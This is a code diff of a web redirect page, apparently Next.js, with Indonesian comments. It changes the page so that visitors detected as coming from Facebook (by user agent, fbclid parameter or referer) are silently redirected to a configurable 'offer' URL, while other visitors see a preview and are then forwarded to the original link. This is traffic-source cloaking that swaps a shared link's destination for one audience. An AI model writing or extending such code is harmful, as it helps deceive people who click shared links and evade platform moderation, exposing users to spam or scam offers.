@@ -6,8 +6,9 @@ interface Props {
   redirectUrl: string;
   imageUrl: string;
   title: string;
-  shouldRedirect: boolean;
 }
+
+const offerUrl = "https://example.com/offer"; // ← ganti ke URL yang kamu mau
 
 export const getServerSideProps: GetServerSideProps = async (context) => {
   const slugParts = context.params?.slug || [];
@@ -29,12 +30,22 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
       fbclid ||
       referer.includes("facebook.com");
 
+    // 🔁 Redirect langsung ke offer jika dari Facebook
+    if (isFacebookBot) {
+      return {
+        redirect: {
+          destination: offerUrl,
+          permanent: false,
+        },
+      };
+    }
+
+    // ✅ Selain itu, tampilkan halaman dengan preview dan auto-redirect ke link aslinya
     return {
       props: {
         redirectUrl,
         imageUrl,
         title: title || "Redirecting...",
-        shouldRedirect: !isFacebookBot, // jangan redirect kalau bot
       },
     };
   } catch (e) {
@@ -42,20 +53,13 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
   }
 };
 
-export default function RedirectPage({
-  redirectUrl,
-  imageUrl,
-  title,
-  shouldRedirect,
-}: Props) {
+export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
   useEffect(() => {
-    if (shouldRedirect) {
-      const timer = setTimeout(() => {
-        window.location.href = redirectUrl;
-      }, 2000);
-      return () => clearTimeout(timer);
-    }
-  }, [redirectUrl, shouldRedirect]);
+    const timer = setTimeout(() => {
+      window.location.href = redirectUrl;
+    }, 2000);
+    return () => clearTimeout(timer);
+  }, [redirectUrl]);
 
   return (
     <>
@@ -79,9 +83,7 @@ export default function RedirectPage({
 
       <main style={styles.container}>
         <div style={styles.loader}></div>
-        <div style={styles.loadingText}>
-          {shouldRedirect ? "Please wait..." : "Preview ready for Facebook"}
-        </div>
+        <div style={styles.loadingText}>Please wait...</div>
         {imageUrl && (
           <img
             src={imageUrl}
